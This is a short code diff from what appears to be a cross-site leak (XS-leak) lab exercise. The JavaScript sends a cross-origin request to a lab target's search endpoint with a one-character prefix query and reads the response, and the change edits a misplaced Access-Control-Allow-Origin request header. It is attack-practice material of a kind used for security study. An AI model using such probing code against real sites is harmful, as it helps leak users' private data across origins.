@@ -12,7 +12,7 @@
       var xhr = new XMLHttpRequest();
       const URL = "https://ptl-d6a4d3a7-93053bd9.libcurl.so/search?search=^c";
       xhr.open("GET", URL, true);
-      xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
+      xhr.setRequestHeader("Access-Control-Allow-Origin", "https://coboleng.github.io/xs-leak/");
       xhr.send();
       xhr.onload = () => {
           const data = xhr.response;
